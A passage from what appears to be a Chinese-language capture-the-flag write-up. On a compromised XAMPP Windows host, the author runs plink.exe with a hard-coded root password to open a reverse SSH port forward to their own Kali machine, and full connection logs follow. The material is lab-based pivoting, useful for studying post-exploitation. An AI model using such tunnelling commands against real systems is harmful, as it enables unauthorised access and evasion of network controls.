+<p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjMTExOyYjMTExOyYjeDc0OyYjeDQwOyYjeDMxOyYjeDMwOyYjeDJlOyYjeDMxOyYjeDMwOyYjNDY7JiN4MzE7JiN4Mzc7JiN4MmU7JiN4MzI7JiM0OTsmI3gzNjs=">&#114;&#111;&#111;&#x74;&#x40;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#x31;&#x37;&#x2e;&#x32;&#49;&#x36;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjMTExOyYjMTExOyYjeDc0OyYjeDQwOyYjNDk7JiN4MzA7JiM0NjsmIzQ5OyYjeDMwOyYjNDY7JiM0OTsmIzU1OyYjeDJlOyYjeDMyOyYjeDMxOyYjeDM2Ow==">&#114;&#111;&#111;&#x74;&#x40;&#49;&#x30;&#46;&#49;&#x30;&#46;&#49;&#55;&#x2e;&#x32;&#x31;&#x36;<i class="fa fa-external-link-alt"></i></span><br>Looking up host “10.10.17.216”<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiN4NzI7JiMxMTg7JiMxMDE7JiN4MzI7JiN4MzU7JiM1MzsmI3gzMTsmIzU3OyYjNDU7JiMxMTU7JiMxMDQ7JiN4NjE7JiM1MDsmI3gzNTsmIzU0OyYjNjQ7JiN4NmM7JiMxMDU7JiM5ODsmI3g3MzsmI3g3MzsmI3g2ODsmI3gyZTsmIzExMTsmI3g3MjsmI3g2Nzs=">&#99;&#x75;&#x72;&#118;&#101;&#x32;&#x35;&#53;&#x31;&#57;&#45;&#115;&#104;&#x61;&#50;&#x35;&#54;&#64;&#x6c;&#105;&#98;&#x73;&#x73;&#x68;&#x2e;&#111;&#x72;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiN4NzI7JiMxMTg7JiMxMDE7JiN4MzI7JiN4MzU7JiM1MzsmI3gzMTsmIzU3OyYjeDJkOyYjeDczOyYjMTA0OyYjeDYxOyYjNTA7JiM1MzsmI3gzNjsmI3g0MDsmI3g2YzsmIzEwNTsmIzk4OyYjMTE1OyYjeDczOyYjMTA0OyYjNDY7JiN4NmY7JiMxMTQ7JiMxMDM7">&#99;&#x75;&#x72;&#118;&#101;&#x32;&#x35;&#53;&#x31;&#57;&#x2d;&#x73;&#104;&#x61;&#50;&#53;&#x36;&#x40;&#x6c;&#105;&#98;&#115;&#x73;&#104;&#46;&#x6f;&#114;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p>
 </blockquote>
 <p><code>第二天我又来了，这回成功了！，这回换成了powershell。</code></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; .\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">.\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">Looking up host <span class="string">&quot;10.10.17.216&quot;</span> <span class="keyword">for</span> SSH connection</span><br><span class="line">Connecting to 10.10.17.216 port 22</span><br><span class="line">We claim version: SSH-2.0-PuTTY_Release_0.74</span><br><span class="line">Remote version: SSH-2.0-OpenSSH_8.3p1 Debian-1</span><br><span class="line">Using SSH protocol version 2</span><br><span class="line">Doing ECDH key exchange with curve Curve25519 and <span class="built_in">hash</span> SHA-256 (SHA-NI accelerated)</span><br><span class="line">Server also has ecdsa-sha2-nistp256/ssh-rsa host keys, but we don<span class="string">&#x27;t know any of them</span></span><br><span class="line"><span class="string">Host key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">The server&#x27;</span>s host key is not cached <span class="keyword">in</span> the registry. You</span><br><span class="line">have no guarantee that the server is the computer you</span><br><span class="line">think it is.</span><br><span class="line">The server<span class="string">&#x27;s ssh-ed25519 key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">If you trust this host, enter &quot;y&quot; to add the key to</span></span><br><span class="line"><span class="string">PuTTY&#x27;</span>s cache and carry on connecting.</span><br><span class="line">If you want to carry on connecting just once, without</span><br><span class="line">adding the key to the cache, enter <span class="string">&quot;n&quot;</span>.</span><br><span class="line">If you <span class="keyword">do</span> not trust this host, press Return to abandon the</span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) outbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) outbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) compression after user authentication</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) inbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) inbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) decompression after user authentication</span><br><span class="line">Using username <span class="string">&quot;root&quot;</span>.</span><br><span class="line">Sent password</span><br><span class="line">Initialised delayed zlib (RFC1950) decompression</span><br><span class="line">Initialised delayed zlib (RFC1950) compression</span><br><span class="line">Access granted</span><br><span class="line">Requesting remote port 8888 forward to 127.0.0.1:8888</span><br><span class="line">Opening main session channel</span><br><span class="line">Remote port forwarding from 8888 enabled</span><br><span class="line">Opened main channel</span><br><span class="line">Started a shell/<span class="built_in">command</span></span><br><span class="line">Linux JIYE 5.7.0-kali1-amd64 <span class="comment">#1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">ls</span><br><span class="line">arachni</span><br><span class="line">cacert.der</span><br><span class="line">clash</span><br><span class="line">CS4.0</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">get-pip.py</span><br><span class="line">htb</span><br><span class="line">Lluna.ovpn</span><br><span class="line">Lluna.ovpn.bak</span><br><span class="line">Music</span><br><span class="line">Pictures</span><br><span class="line">Public</span><br><span class="line">python_shell</span><br><span class="line">Templates</span><br><span class="line">Videos</span><br><span class="line">vulnhub</span><br></pre></td></tr></table></figure>
